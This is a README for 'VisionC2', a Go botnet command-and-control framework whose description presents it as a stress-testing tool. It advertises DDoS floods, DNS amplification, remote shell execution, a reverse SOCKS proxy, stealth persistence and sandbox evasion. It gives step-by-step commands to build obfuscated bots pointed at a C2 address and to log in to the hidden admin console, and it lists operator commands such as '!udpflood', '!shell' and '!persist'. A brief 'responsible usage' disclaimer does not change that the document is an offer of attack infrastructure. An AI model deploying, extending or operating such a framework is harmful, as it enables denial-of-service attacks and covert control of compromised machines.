# VisionC2 – Advanced Botnet Command & Control Framework

![VisionC2 Banner](https://img.shields.io/badge/VisioNNet-V3-red)
![Go Version](https://img.shields.io/badge/Go-1.21+-blue)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-green)

**VisionC2** is an advanced botnet framework built in Go focused on network stress testing. It features end to end encryption, sophisticated anti-analysis techniques, as well as DDOS/RCE/SOCKS Modules with more features to come.

## Dev TODO
- Check and Fix Persistence Methods
- Implement user:pass options into reverse Socks5 Proxy Module
- Adjustments to run seamless on windows aswell 
- Hidden Admin Portal to easier manage individual bots 
---
## ⚡ Core Capabilities

### **Advanced Attack Vectors**
- **Network Stress Testing**: UDP/TCP/HTTP/SYN/ACK flood capabilities
- **Protocol-Level Attacks**: DNS amplification and GRE flood techniques
- **Secure Shell Access**: Remote command execution with encrypted output
- **Proxy Tunneling**: Built-in SOCKS5 reverse proxy for secure access
- **Persistent Operations**: Background execution and detach capabilities

### **Bot Agent Features**
- **Cross-Platform Compatibility**: Linux, Windows, macOS support
- **Architecture Detection**: Automatic adaptation to 14+ CPU types
- **Stealth Persistence**: Multiple installation and survival methods
- **Encrypted Communications**: TLS-protected command channels
- **Resource-Aware Execution**: Minimal footprint with maximum capability

### **Enterprise Command & Control**
- **Real-Time Bot Management**: Target by botid or broadcast 
- **Streamlined Ouput**: Psuedo Interactive Shell via !botid !shell <command>
- **Professional Interface**: Color-coded terminal with dynamic user indicators

---
### 🔐 **Military-Grade Security Stack**
- **TLS 1.3 Encryption**: State-of-the-art encrypted communications
- **HMAC Authentication**: Challenge-response authentication prevents impersonation
- **Multi-User Role Management**: Four-tier permission system (Owner, Admin, Pro, Basic)
- **Command Origin Tracking**: Every action is logged and attributed to specific users
- **Automatic Data Obfuscation**: Sensitive outputs are Base64-encoded in transit

### 🛡️ **Advanced Anti-Detection**
- **Sandbox Evasion**: Multi-stage detection of virtualized environments
- **String Obfuscation**: Critical strings are hidden from static analysis
- **Binary Protection**: UPX compression with string removal techniques
- **Persistence Layers**: Multiple survival mechanisms across platforms
- **Architecture-Agnostic**: 14+ CPU architectures supported seamlessly

---

## 🏗️ Architecture Overview

VisionC2 operates on a client-server model with clear separation between administrative interfaces and bot agents:

```
┌─────────────────┐    TLS 1.3    ┌─────────────────┐
│   Admin Console │◄──────────────►│    C2 Server    │
│  (Multi-User)   │                │  (Go Backend)   │
└─────────────────┘                └─────────────────┘
                                         │ TLS 1.3
                                         ▼
┌─────────────────┐                ┌─────────────────┐
│   Bot Agents    │◄───────────────┤  Bot Registry   │
│ (14+ Architectures)│                │ & Management   │
└─────────────────┘                └─────────────────┘
```

---

## 🔧 Getting Started

### Prerequisites

```bash
# Install core dependencies
sudo apt update
sudo apt install -y golang-go upx-ucl openssl git

# Optional: Enhanced binary protection
git clone https://github.com/Syn2Much/upx-stripper
```

### Quick Deployment

```bash
# Clone and setup
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2

# Generate secure certificates
openssl genrsa -out server.key 4096
openssl req -new -x509 -sha256 -key server.key -out server.crt -days 365 \
  -subj "/C=US/O=Security Research/CN=visionc2.local"

# Configure your environment
cd cnc
# Edit main.go with your server details
go run .  # First run creates admin user

# Logging in
nc 1.1.1.1 955 (this is your server port and address)
You'll see a blank screen at first type "spamtec" to find login prompt 
```

### Bot Deployment

```bash
cd bot
# Configure your C2 endpoint
python3 tools/obfuscate_c2.py "1.2.3.4:443"

# Build for multiple architectures
chmod +x build.sh
./build.sh
```

---

## 🎯 Professional Usage Examples

### Team-Based Security Operations

```bash
# Owner-level administration
[Owner@admin]► db                    # Manage user database
[Owner@admin]► !shell netstat -tlnp  # System reconnaissance

# Admin-level bot management  
[Admin@operator1]► persist           # Establish persistence
[Admin@operator1]► !info             # Gather intelligence

# Pro-level tactical operations
[Pro@analyst]► !socks 1080          # Setup proxy tunnel
[Pro@analyst]► !shell whoami        # Identity verification

# Basic-level distributed testing
[Basic@tester]► !udpflood 192.168.1.1 80 60
```

---
## 🛠️ Command Reference

### User Management
- `help` - Context-aware help system (shows available commands)
- `db` - User database management (Owner only)
- `private` - Specialized commands based on clearance level

### Bot Operations
- `bots` - List all active agents with detailed status
- `!<botid> <command>` - Target specific agent
- `!info` - Comprehensive system intelligence
- `!persist` - Enhanced persistence mechanisms
- `!reinstall` - Agent redeployment
- `!lolnogtfo` - Secure agent removal

### Network Operations  
- `!socks <port>` - Establish SOCKS5 reverse proxy
- `!stopsocks` - Terminate proxy connections
- `!shell <command>` - Secure remote execution
- `!detach <command>` - Background process execution
- `!stream <command>` - Real-time output streaming

### Stress Testing
- `!udpflood <ip> <port> <duration>`
- `!tcpflood <ip> <port> <duration>`
- `!http <ip> <port> <duration>`
- `!syn/!ack/!gre/!dns` - Protocol-specific attacks

---

## ⚖️ Responsible Usage

**VisionC2 is exclusively for:**
- Authorized penetration testing
- Security research and education
- Red team operations with proper authorization
- Defensive security training and preparation

**Strictly Prohibited:**
- Unauthorized network access
- Malicious attacks without permission
- Violation of laws or regulations
- Harmful or disruptive activities

All users must obtain explicit written permission before deployment and assume full legal responsibility for their actions.

---

## 🤝 Community & Support

### Contributing
We welcome contributions from security professionals:
- Code improvements and optimizations
- Additional evasion techniques
- Enhanced security features
- Documentation and examples

### Acknowledgments
Built upon the framework of [1birdo](https://github.com/1Birdo)'s BotnetGo

---

## 📧 Professional Inquiries

For authorized security research, educational use, or professional consultation:

**[dev@sinners.city](mailto:dev@sinners.city)**
---
